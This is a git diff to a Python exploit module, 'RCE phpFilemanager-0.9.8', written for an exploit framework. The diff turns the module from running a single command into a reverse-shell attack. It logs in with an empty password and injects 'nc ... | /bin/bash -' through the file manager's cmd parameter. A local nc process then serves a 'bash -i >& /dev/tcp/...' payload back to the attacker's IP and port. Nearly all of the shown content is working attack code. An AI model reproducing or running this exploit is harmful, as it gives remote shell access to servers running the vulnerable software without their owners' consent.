@@ -3,7 +3,8 @@ from collections import OrderedDict
 from shellcodes.Shellcodes import OSShellcodes
 
 import argparse
-import requests, sys
+import requests,sys,os
+import threading
 
 INFO = {}
 INFO['NAME'] = "RCE phpFilemanager-0.9.8"
@@ -20,29 +21,37 @@ INFO['AUTHOR'] = "dmts"
 
 OPTIONS = OrderedDict()
 OPTIONS["URL"] = "example.com", dict(description = 'URL to phpFilemanager-0.9.8')
-OPTIONS["COMMAND"] = "id", dict(description = 'Command to run')
-#OPTIONS["LOCAL_IP_ADDRESS"] = "192.168.1.115", dict(description = 'System IP address (ex. 192.168.10.20)')
-#OPTIONS["REVERSE_CONNECTION_PORT"] = 4000, dict(description = 'Reverse connection port for shellcode')
+#OPTIONS["COMMAND"] = "id", dict(description = 'Command to run')
+OPTIONS["LOCAL_IP_ADDRESS"] = "192.168.1.115", dict(description = 'System IP address (ex. 192.168.10.20)')
+OPTIONS["REVERSE_CONNECTION_PORT"] = "4000", dict(description = 'Reverse connection port for shellcode')
 #####################################################################
 class exploit(Sploit):
-	def __init__(self,url="",command='',logger=None):
+	def __init__(self,url="example.xom",ip="127.0.0.1",portr="4000",logger=None):
 		Sploit.__init__(self, logger=logger)
 		self.name = INFO['NAME'] 
 		self.url = url
-		self.command = command
-		#self.ip = ip
-		#self.portr = portr
+		#self.command = command
+		self.ip = ip
+		self.portr = portr
 	def args(self):
 		self.args = Sploit.args(self, OPTIONS)
 		self.url = self.args.get("URL", self.url)
-		self.command = self.args.get("COMMAND", self.command)
-		#self.ip = self.args.get("LOCAL_IP_ADDRESS", self.ip)
-		#self.portr = self.args.get("REVERSE_CONNECTION_PORT", self.portr)
+		#self.command = self.args.get("COMMAND", self.command)
+		self.ip = self.args.get("LOCAL_IP_ADDRESS", self.ip)
+		self.portr = self.args.get("REVERSE_CONNECTION_PORT", self.portr)
 
-	def attack(self,url,command):
+	def transfer(self):
+	        conn = "echo \"bash -i >& /dev/tcp/"+self.ip+"/"+self.portr+" 0>&1\" |nc -l 1212"
+        	os.system(conn)
+
+	def listener(self):
+        	conn = 'nc -l '+self.portr
+		os.system(conn)
+
+	def attack(self):
 		session = requests.session()
 		try:
-			url='http://'+url+'/index.php'
+			url='http://'+self.url+'/index.php'
 			params={'frame':3,'pass':''}
 			get_in =session.post(url,data=params)
 			get_in.raise_for_status()
@@ -51,20 +60,25 @@ class exploit(Sploit):
 			self.log(e)
 			sys.exit(1)
 		try:
-			resp =session.get(url,params={'action':6,'cmd':command})
-			resp.raise_for_status() 
-			self.log('[*] Command to execute : '+command)
-			self.log(resp.text)		
-		except requests.exceptions.HTTPError as e:
-			self.log('[!] [FAIL] Failed to execute command : ')
-			self.log(e)
-			sys.exit(1)
+	                x = threading.Thread(target=self.transfer, args=())
+        	        x.start()
+                	#y = threading.Thread(target=self.listener, args=())
+        	        #y.start()
+	                command="nc -N "+self.ip+" 1212 | /bin/bash -"
+                	url=url+'?action=6&cmd='+command
+	                resp =session.get(url,timeout=3)
+	        except requests.exceptions.ReadTimeout:
+			x.join()
+                	#y.join()
+	        except :
+        	        print('\33[1;31;40m[!] [FAIL]\33[0m\nFailed to establish connection')
+                	sys.exit(1)
 
 	def run(self):
 		self.args()
 		self.log('Starting')
 		######### MAIN CODE ###########
-		self.attack(self.url,self.command)	
+		self.attack()
 		###############################
         	self.finish(True)
 
